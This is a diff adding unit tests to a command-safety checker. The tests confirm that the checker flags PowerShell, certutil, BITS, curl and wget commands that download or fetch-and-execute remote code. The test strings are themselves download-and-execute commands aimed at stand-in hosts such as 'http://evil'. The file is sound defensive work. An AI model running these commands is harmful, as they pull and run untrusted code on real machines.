@@ -81,6 +81,23 @@ describe('security / normalizeCmd — obfuscation is defeated before matching', 
     });
 });
 
+describe('security / isDestructiveCmd — remote-code-fetch / download verbs (v1.7.232 C3)', () => {
+    it('flags download-to-disk and fetch-then-execute primitives', () => {
+        expect(isDestructiveCmd('iwr http://evil/p.ps1 -OutFile $env:TEMP\\p.ps1')).toBe(true);
+        expect(isDestructiveCmd('Invoke-WebRequest https://x/a.exe -OutFile a.exe')).toBe(true);
+        expect(isDestructiveCmd('Invoke-RestMethod https://x/s | iex')).toBe(true);
+        expect(isDestructiveCmd('iex (New-Object Net.WebClient).DownloadString("http://x")')).toBe(true);
+        expect(isDestructiveCmd('certutil -urlcache -split -f http://x/a.exe a.exe')).toBe(true);
+        expect(isDestructiveCmd('Start-BitsTransfer -Source http://x/a -Destination a')).toBe(true);
+        expect(isDestructiveCmd('curl http://x -o C:\\a.exe')).toBe(true);
+        expect(isDestructiveCmd('wget http://x -O a')).toBe(true);
+    });
+    it('still leaves plain read-only PowerShell alone', () => {
+        // sanity: the download alternation did not broaden Get-*/Select-* etc.
+        expect(isDestructiveCmd('Get-Process | Select-Object Name,CPU')).toBe(false);
+    });
+});
+
 describe('security / DESTRUCTIVE_RE is exported and is a RegExp', () => {
     it('is usable directly', () => {
         expect(DESTRUCTIVE_RE).toBeInstanceOf(RegExp);
